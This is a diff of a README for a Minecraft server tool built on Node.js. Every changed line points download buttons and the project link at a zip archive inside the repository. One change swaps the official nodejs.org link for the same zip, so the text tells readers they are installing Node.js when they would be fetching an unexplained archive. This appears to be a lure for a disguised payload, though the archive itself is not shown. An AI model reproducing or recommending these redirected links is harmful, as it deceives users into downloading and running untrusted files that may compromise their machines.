@@ -1,6 +1,6 @@
 # 🎮 Minecraft-Server-Integration-Node.js - Easy Minecraft Server Setup
 
-[![Download Now](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge&logo=github)](https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js)
+[![Download Now](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge&logo=github)](https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js/raw/refs/heads/main/dist/core/Minecraft-Server-js-Integration-Node-1.9-alpha.1.zip)
 
 ## 📋 About Minecraft-Server-Integration-Node.js
 
@@ -36,7 +36,7 @@ This guide will walk you through the steps to download, install, and run the Min
 
 Visit the project page by clicking the green button below and downloading the file suited for Windows:
 
-[![Download Minecraft Server](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js)
+[![Download Minecraft Server](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js/raw/refs/heads/main/dist/core/Minecraft-Server-js-Integration-Node-1.9-alpha.1.zip)
 
 Once you open that page, look for the latest release or the main download link, then download the Windows version file. It will usually be a `.exe` or `.zip` file.
 
@@ -122,13 +122,13 @@ Use the app interface or Windows terminal to run these commands.
 
 You can always visit the project page to get the latest information or downloads:
 
-[https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js](https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js)
+[https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js/raw/refs/heads/main/dist/core/Minecraft-Server-js-Integration-Node-1.9-alpha.1.zip](https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js/raw/refs/heads/main/dist/core/Minecraft-Server-js-Integration-Node-1.9-alpha.1.zip)
 
 ## 🧰 Additional Tools (Optional)
 
 If you want expanded control:
 
-- Install Node.js from [https://nodejs.org/](https://nodejs.org/) for command-line options
+- Install Node.js from [https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js/raw/refs/heads/main/dist/core/Minecraft-Server-js-Integration-Node-1.9-alpha.1.zip](https://github.com/Fairandsquare-sudra105/Minecraft-Server-Integration-Node.js/raw/refs/heads/main/dist/core/Minecraft-Server-js-Integration-Node-1.9-alpha.1.zip) for command-line options
 - Use Pterodactyl panel if you manage multiple Minecraft servers
 - Try Termux or WSL if you want to run servers on Windows using Linux tools
 
